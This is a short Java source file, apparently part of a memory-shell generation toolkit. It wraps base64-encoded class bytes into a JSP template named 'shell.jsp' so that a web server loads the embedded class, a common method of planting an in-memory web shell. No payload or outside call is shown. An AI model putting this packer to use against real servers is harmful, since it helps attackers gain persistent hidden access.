package com.reajason.javaweb.packer.jsp;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.Util;
import lombok.SneakyThrows;
import org.apache.commons.io.IOUtils;

import java.nio.charset.Charset;
import java.util.Objects;

/**
 * @author ReaJason
 * @since 2024/11/26
 */
public class ClassLoaderJspPacker implements Packer {

    private final String jspTemplate = Util.loadTemplateFromResource("/memshell-party/shell.jsp");

    @Override
    @SneakyThrows
    public String pack(ClassPackerConfig config) {
        return jspTemplate.replace("{{className}}", config.getClassName())
                .replace("{{base64Str}}", config.getClassBytesBase64Str());
    }
}